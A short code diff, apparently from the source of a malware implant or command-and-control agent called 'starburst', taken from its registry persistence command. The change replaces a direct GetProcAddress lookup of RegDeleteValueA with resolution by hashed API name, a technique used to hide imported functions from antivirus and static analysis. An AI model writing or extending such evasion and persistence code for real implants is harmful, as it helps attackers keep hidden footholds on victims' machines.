@@ -93,9 +93,9 @@ auto declfn starburst::cmd_persist_run(
         }
 
         auto pRegDeleteValueA = reinterpret_cast<fn_RegDeleteValueA>(
-            inst.kernel32.GetProcAddress(
-                (HMODULE)inst.advapi32.handle,
-                symbol<LPCSTR>( "RegDeleteValueA" ) ) );
+            resolve::_api(
+                reinterpret_cast<uintptr_t>( (HMODULE)inst.advapi32.handle ),
+                expr::hash_string( "RegDeleteValueA" ) ) );
         if ( !pRegDeleteValueA ) {
             inst.advapi32.RegCloseKey( h_key );
             queue_response( inst, task_uuid, RESPONSE_ERROR,
